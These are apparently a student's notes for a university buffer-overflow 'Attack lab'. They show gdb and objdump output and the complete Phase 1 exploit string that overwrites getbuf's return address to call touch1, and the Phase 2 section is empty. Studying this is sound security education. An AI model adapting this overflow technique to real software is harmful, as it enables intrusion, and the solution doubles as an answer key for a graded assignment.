@@ -1,0 +1,107 @@
+Attack lab:
+ssh jieyun@lnxsrv09.seas.ucla.edu
+cd target164
+// My Cookie for later reference: 0x4e99cb1b
+objdump -d ctarget
+// copy all the assembly code into a Google docs file
+objdump -d rtarget
+// copy all the assembly code into a Google docs file
+
+[jieyun@lnxsrv09 ~/target164]$ chmod +x ctarget // since permission was denied the first time I ran ctarget
+[jieyun@lnxsrv09 ~/target164]$ chmod +x rtarget
+[jieyun@lnxsrv09 ~/target164]$ chmod +x hex2raw
+[jieyun@lnxsrv09 ~/target164]$ chmod +x farm.c
+[jieyun@lnxsrv09 ~/target164]$ chmod +x cookie.txt
+[jieyun@lnxsrv09 ~/target164]$ chmod +x README.txt
+
+gdb ctarget
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//                                              Phase 1                                               //
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// Need to redirect the program to execute an existing procedure.
+// More specifically, make the getbuf function to execute the touch1 function, 
+// when getbuf reaches its return statement,
+// instead of returning back to the test function.
+
+(gdb) run
+Type string:asdf
+No exploit.  Getbuf returned 0x1
+Normal return
+[Inferior 1 (process 1746) exited normally]
+// Need to use an exploit string.
+
+(gdb) b getbuf
+Breakpoint 1 at 0x401757: file buf.c, line 12.
+
+(gdb) run
+Starting program: /w/home.05/ee/ugrad/jieyun/target164/ctarget 
+Cookie: 0x4e99cb1b
+
+Breakpoint 1, getbuf () at buf.c:12
+12	buf.c: No such file or directory.
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-196.el7_4.2.x86_64
+
+(gdb) disas
+Dump of assembler code for function getbuf:
+=> 0x0000000000401757 <+0>:	sub    $0x38,%rsp
+   0x000000000040175b <+4>:	mov    %rsp,%rdi
+   0x000000000040175e <+7>:	callq  0x40199a <Gets>
+   0x0000000000401763 <+12>:	mov    $0x1,%eax
+   0x0000000000401768 <+17>:	add    $0x38,%rsp
+   0x000000000040176c <+21>:	retq   
+End of assembler dump.
+
+// 0x38 is 56 bytes of buffer located for getbuf
+// put 56 bytes of padding and then the return address of touch1
+
+// In my objdump for rtarget, touch1 has the assembly code:
+000000000040176d <touch1>:
+  40176d:	48 83 ec 08          	sub    $0x8,%rsp
+  401771:	c7 05 81 3d 20 00 01 	movl   $0x1,0x203d81(%rip)        # 6054fc <vlevel>
+  401778:	00 00 00 
+  40177b:	bf 22 30 40 00       	mov    $0x403022,%edi
+  401780:	e8 cb f4 ff ff       	callq  400c50 <puts@plt>
+  401785:	bf 01 00 00 00       	mov    $0x1,%edi
+  40178a:	e8 1a 05 00 00       	callq  401ca9 <validate>
+  40178f:	bf 00 00 00 00       	mov    $0x0,%edi
+  401794:	e8 57 f6 ff ff       	callq  400df0 <exit@plt>
+
+// The address of the touch1 function is 0x000000000040176d
+// So the answer for this phase is:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 // 56 bytes of padding
+6d 17 40 00 00 00 00 00 // address of touch1 function in little endian
+
+quit // quit gdb
+
+[jieyun@lnxsrv09 ~/target164]$ ./hex2raw <phase1.txt> raw-phase1.txt
+[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase1.txt
+Cookie: 0x4e99cb1b
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//                                              Phase 2                                               //
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
